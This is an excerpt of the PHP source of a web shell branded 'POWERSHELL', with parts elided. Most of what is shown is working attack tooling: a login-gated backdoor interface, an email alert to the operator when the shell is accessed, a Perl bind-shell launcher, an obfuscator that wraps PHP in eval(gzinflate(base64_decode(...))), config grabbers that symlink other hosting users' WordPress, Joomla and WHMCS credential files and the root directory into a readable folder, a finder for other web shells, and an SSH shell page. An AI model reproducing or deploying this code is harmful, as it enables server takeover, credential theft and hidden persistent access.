...
/*------------------ End of Anti Crawler -----*/
    ...
    echo "<style>
    html { background:url(https://static.vecteezy.com/system/resources/previews/001/849/553/original/modern-gold-background-free-vector.jpg) black; }
    ...
    if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        ...
        else
        {
            ...
            echo '<title>POWERSHELL</title><center>
            ...
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>POWERSHELL</b></font></th></tr>
...
echo "<title>POWERSHELL</title><div id=result>
<table>
    <tbody>
        <tr>
            <td style='border-right:1px solid #104E8B;' width=\"300px;\">
            <div style='text-align:center;'>
                <a href='?' style='text-decoration:none;'><h1>POWERSHELL</h1></a><font color=blue>MINI SHELL</font>
            </div>
            </td>
            <td>
...
function mail_alert()
{
    ...
    mail($email, "Shell Accessed!!!", $content_mail ,"From: powershell@ggvayne.com");
}
...
function reverse_conn_bg()
{
    ...
    else if($option=="PERL Bind Shell")
    {
        ...
        fclose($handlr);
        if(file_exists("perl_bind.pl"))
        {
            if($os=="nix")
            {
                cmd("chmod +x perl_bind.pl;perl perl_bind.pl $port");
            }
            else
            {
                cmd("perl perl_bind.pl $port");
            }
        }
    }
}
...
function php_ende_bg()
{
        ...
        case "Encode":
            switch($typ_d)
            {
                case "GZINFLATE":
                    ...
                    $res_t="<?php /* Encoded in POWERSHELL SHELL PROJECT */ eval(gzinflate(base64_decode(\"$res_t\"))); ?>";
                    break;
                case "GZUNCOMPRESS":
                    $res_t=base64_encode(gzcompress(trim(stripslashes($c_ntent.' '),'<?php, ?>'),9));
                    $res_t="<?php /* Encoded in POWERSHELL SHELL PROJECT */ eval(gzuncompress(base64_decode(\"$res_t\"))); ?>";
                    break;
                case "STR_ROT13":
                    $res_t=trim(stripslashes($c_ntent.' '),'<?php, ?>');
                    $res_t=base64_encode(str_rot13($res_t));
                    $res_t="<?php /* Encoded in POWERSHELL SHELL PROJECT */ eval(str_rot13(base64_decode(\"$res_t\"))); ?>";
                    break;                  
            }
        break;
        case "Decode":
    ...
    echo "<div id=result><center><h2>POWERSHELL</h2><hr /><textarea spellcheck='false' class=textarea_edit cols='80' rows='25'>".htmlspecialchars($res_t)."</textarea></center></div>";
}
...
function remote_file_check_ui()
{
    echo "<div id=result><center><h2>Remote File Check</h2><hr /><br /><br />
          ...
          <tr><td><font color=red>Input File's Names in TextArea</font></tr></td><tr><td><textarea spellcheck='false' class='textarea_edit' cols=50 rows=30 name='tryzzz'>powershell.php
ajithkp560.php
index.html
profile.php
c99.php
...
{
		symlink('/home/'.$usernamexx.'/public_html/vb/includes/config.php','POWERSHELL/'.$domainxx.' =>vBulletin1.txt');
		symlink('/home/'.$usernamexx.'/public_html/includes/config.php','POWERSHELL/'.$domainxx.' =>vBulletin2.txt');
		symlink('/home/'.$usernamexx.'/public_html/forum/includes/config.php','POWERSHELL/'.$domainxx.' =>vBulletin3.txt');
		symlink('/home/'.$usernamexx.'/public_html/cc/includes/config.php','POWERSHELL/'.$domainxx.' =>vBulletin4.txt');
		symlink('/home/'.$usernamexx.'/public_html/inc/config.php','POWERSHELL/'.$domainxx.' =>mybb.txt');
		symlink('/home/'.$usernamexx.'/public_html/config.php','POWERSHELL/'.$domainxx.' =>Phpbb1.txt');
		symlink('/home/'.$usernamexx.'/public_html/forum/includes/config.php','POWERSHELL/'.$domainxx.' =>Phpbb2.txt');
		symlink('/home/'.$usernamexx.'/public_html/wp-config.php','POWERSHELL/'.$domainxx.' =>Wordpress1.txt');
		symlink('/home/'.$usernamexx.'/public_html/blog/wp-config.php','POWERSHELL/'.$domainxx.' =>Wordpress2.txt');
		symlink('/home/'.$usernamexx.'/public_html/configuration.php','POWERSHELL/'.$domainxx.' =>Joomla1.txt');
		symlink('/home/'.$usernamexx.'/public_html/blog/configuration.php','POWERSHELL/'.$domainxx.' =>Joomla2.txt');
		symlink('/home/'.$usernamexx.'/public_html/joomla/configuration.php','POWERSHELL/'.$domainxx.' =>Joomla3.txt');
		symlink('/home/'.$usernamexx.'/public_html/whm/configuration.php','POWERSHELL/'.$domainxx.' =>Whm1.txt');
		symlink('/home/'.$usernamexx.'/public_html/whmc/configuration.php','POWERSHELL/'.$domainxx.' =>Whm2.txt');
		symlink('/home/'.$usernamexx.'/public_html/support/configuration.php','POWERSHELL/'.$domainxx.' =>Whm3.txt');
		symlink('/home/'.$usernamexx.'/public_html/client/configuration.php','POWERSHELL/'.$domainxx.' =>Whm4.txt');
		symlink('/home/'.$usernamexx.'/public_html/billings/configuration.php','POWERSHELL/'.$domainxx.' =>Whm5.txt');
		symlink('/home/'.$usernamexx.'/public_html/billing/configuration.php','POWERSHELL/'.$domainxx.' =>Whm6.txt');
		symlink('/home/'.$usernamexx.'/public_html/clients/configuration.php','POWERSHELL/'.$domainxx.' =>Whm7.txt');
		symlink('/home/'.$usernamexx.'/public_html/whmcs/configuration.php','POWERSHELL/'.$domainxx.' =>Whm8.txt');
		symlink('/home/'.$usernamexx.'/public_html/order/configuration.php','POWERSHELL/'.$domainxx.' =>Whm9.txt');
		symlink('/home/'.$usernamexx.'/public_html/admin/conf.php','POWERSHELL/'.$domainxx.' =>5.txt');
		symlink('/home/'.$usernamexx.'/public_html/admin/config.php','POWERSHELL/'.$domainxx.' =>4.txt');
		symlink('/home/'.$usernamexx.'/public_html/conf_global.php','POWERSHELL/'.$domainxx.' =>invisio.txt');
		symlink('/home/'.$usernamexx.'/public_html/include/db.php','POWERSHELL/'.$domainxx.' =>7.txt');
		symlink('/home/'.$usernamexx.'/public_html/connect.php','POWERSHELL/'.$domainxx.' =>8.txt');
		symlink('/home/'.$usernamexx.'/public_html/mk_conf.php','POWERSHELL/'.$domainxx.' =>mk-portale1.txt');
		symlink('/home/'.$usernamexx.'/public_html/include/config.php','POWERSHELL/'.$domainxx.' =>12.txt');
		symlink('/home/'.$usernamexx.'/public_html/settings.php','POWERSHELL/'.$domainxx.' =>Smf.txt');
		symlink('/home/'.$usernamexx.'/public_html/includes/functions.php','POWERSHELL/'.$domainxx.' =>phpbb3.txt');
		symlink('/home/'.$usernamexx.'/public_html/include/db.php','POWERSHELL/'.$domainxx.' =>infinity.txt');
}

function config_grabber_bg()
{
    global $sym_htaccess,$sym_php_ini;
    mkdir('POWERSHELL', 0777);
    symlink("/", "POWERSHELL/root");
    $htaccess=fopen('POWERSHELL/.htaccess', 'wb');
    fwrite($htaccess,$sym_htaccess);
    $php_ini_x=fopen('POWERSHELL/php.ini', 'wb');
    ...
    echo "<script>window.open('POWERSHELL/', '_blank');</script>";
    alert('Config Grab compted. Check configs in direcory POWERSHELL');
}
...
{
    symlink('/home/'.$usernamexx.'/public_html/blog/configuration.php', "POWERSHELL/".$user." =>blog/configuration.php");
    symlink('/home/'.$user.'/public_html/forum/includes/config.php', "POWERSHELL/".$user." =>forum/includes/config.php");
    symlink("/home/".$user."/public_html/wp-config.php", "POWERSHELL/".$user." =>wp-config.php");
    symlink("/home/".$user."/public_html/wordpress/wp-config.php", "POWERSHELL/".$user." =>wordpress/wp-config.php");
    symlink("/home/".$user."/public_html/configuration.php", "POWERSHELL/".$user." =>configuration.php");
    symlink("/home/".$user."/public_html/blog/wp-config.php", "POWERSHELL/".$user." =>blog/wp-config.php");
    symlink("/home/".$user."/public_html/joomla/configuration.php", "POWERSHELL/".$user." =>joomla/configuration.php");
    symlink("/home/".$user."/public_html/vb/includes/config.php", "POWERSHELL/".$user." =>vb/includes/config.php");
    symlink("/home/".$user."/public_html/includes/config.php", "POWERSHELL/".$user." =>includes/config.php");
    symlink("/home/".$user."/public_html/conf_global.php", "POWERSHELL/".$user." =>conf_global.php");
    symlink("/home/".$user."/public_html/inc/config.php", "POWERSHELL/".$user." =>inc/config.php");
    symlink("/home/".$user."/public_html/config.php", "POWERSHELL/".$user." =>config.php");
    symlink("/home/".$user."/public_html/Settings.php", "POWERSHELL/".$user." =>/Settings.php");
    symlink("/home/".$user."/public_html/sites/default/settings.php", "POWERSHELL/".$user." =>sites/default/settings.php");
    symlink("/home/".$user."/public_html/whm/configuration.php", "POWERSHELL/".$user." =>whm/configuration.php");
    symlink("/home/".$user."/public_html/whmcs/configuration.php", "POWERSHELL/".$user." =>whmcs/configuration.php");
    symlink("/home/".$user."/public_html/support/configuration.php", "POWERSHELL/".$user." =>support/configuration.php");
    symlink("/home/".$user."/public_html/whmc/WHM/configuration.php", "POWERSHELL/".$user." =>whmc/WHM/configuration.php");
    symlink("/home/".$user."/public_html/whm/WHMCS/configuration.php", "POWERSHELL/".$user." =>whm/WHMCS/configuration.php");
    symlink("/home/".$user."/public_html/whm/whmcs/configuration.php", "POWERSHELL/".$user." =>whm/whmcs/configuration.php");
    symlink("/home/".$user."/public_html/support/configuration.php", "POWERSHELL/".$user." =>support/configuration.php");
    symlink("/home/".$user."/public_html/clients/configuration.php", "POWERSHELL/".$user." =>clients/configuration.php");
    symlink("/home/".$user."/public_html/client/configuration.php", "POWERSHELL/".$user." =>client/configuration.php");
    symlink("/home/".$user."/public_html/clientes/configuration.php", "POWERSHELL/".$user." =>clientes/configuration.php");
    symlink("/home/".$user."/public_html/cliente/configuration.php", "POWERSHELL/".$user." =>cliente/configuration.php");
    symlink("/home/".$user."/public_html/clientsupport/configuration.php", "POWERSHELL/".$user." =>clientsupport/configuration.php");
    symlink("/home/".$user."/public_html/billing/configuration.php", "POWERSHELL/".$user." =>billing/configuration.php");
    symlink("/home/".$user."/public_html/admin/config.php", "POWERSHELL/".$user." =>admin/config.php");
}
...
function sym_xxx()
{
    ...
    mkdir('POWERSHELL', 0777);
    symlink("/", "POWERSHELL/root");
    $htaccess=@fopen('POWERSHELL/.htaccess', 'w');
    fwrite($htaccess,$sym_htaccess);
    $php_ini_x=fopen('POWERSHELL/php.ini', 'w');
    fwrite($php_ini_x, $sym_php_ini);
...
function shell_finder_bg()
{
    ...
    $ShellZ=array("powershell.php", "c99.php", "c100.php","r57.php", "b374k.php", "c22.php", "sym.php", "symlink_sa.php", "r00t.php", "webr00t.php", "sql.php","cpanel.php", "wso.php", "404.php", "aarya.php", "greenshell.php", "ddos.php", "madspot.php", "1337.php", "31337.php", "WSO.php", "dz.php", "cpn.php", "sh3ll.php", "mysql.php", "killer.php", "cgishell.pl", "dz0.php", "whcms.php", "vb.php", "gaza.php", "d0mains.php", "changeall.php", "h4x0r.php", "L3b.php", "uploads.php", "shell.asp", "cmd.asp", "sh3ll.asp", "b374k-2.2.php", "m1n1.php", "b374km1n1.php");
...
function ssh_man_bg()
{
    ...
    if($_GET['ssh_cmd']!="" && $_GET['ssh_cmd'])
    {
        ...
        ?>
    <div id=result><center><h2>SSH Shell by POWERSHELL</h2><hr /><br /><br /><textarea class='textarea_edit' rows=20 cols=60></textarea>
